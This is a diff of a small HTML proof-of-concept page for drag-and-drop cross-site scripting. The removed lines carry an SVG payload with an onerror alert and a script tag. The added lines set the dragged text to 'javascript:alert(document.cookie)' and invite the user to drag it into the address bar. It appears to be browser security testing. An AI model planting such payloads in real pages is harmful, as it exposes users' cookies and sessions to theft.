@@ -1,12 +1,21 @@
 <!DOCTYPE html>
-<meta charset="UTF-8">
-<title>Drag And Drop Proof of Concept</title>
-<script>const payload = `
-  <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='' onerror='alert(1337)' /&gt;&lt;script&gt;alert(2)&lt;/script&gt;&lt;/svg&gt;#x" />
-`;</script>
-<div
-  style="background:lightblue; padding: 2em; width:100px"
-  draggable=true
-  ondragstart="event.dataTransfer.setData('text/html', payload)"
->Drag me!</div>
-<div contenteditable style="border: 1px solid black; padding:2em; margin-top: 2em; height:200px">Drop here!</div>
+<html>
+<head>
+  <title>Drag XSS Test</title>
+</head>
+<body>
+
+<h2>Drag this to the address bar 👇</h2>
+
+<a href="#" draggable="true" id="dragme" style="padding:10px;background:red;color:white;cursor:grab;">
+  Drag me
+</a>
+
+<script>
+document.getElementById('dragme').ondragstart = function(e) {
+  e.dataTransfer.setData(
+    'text/plain',
+    'javascript:alert(document.cookie)'
+  );
+};
+</script>
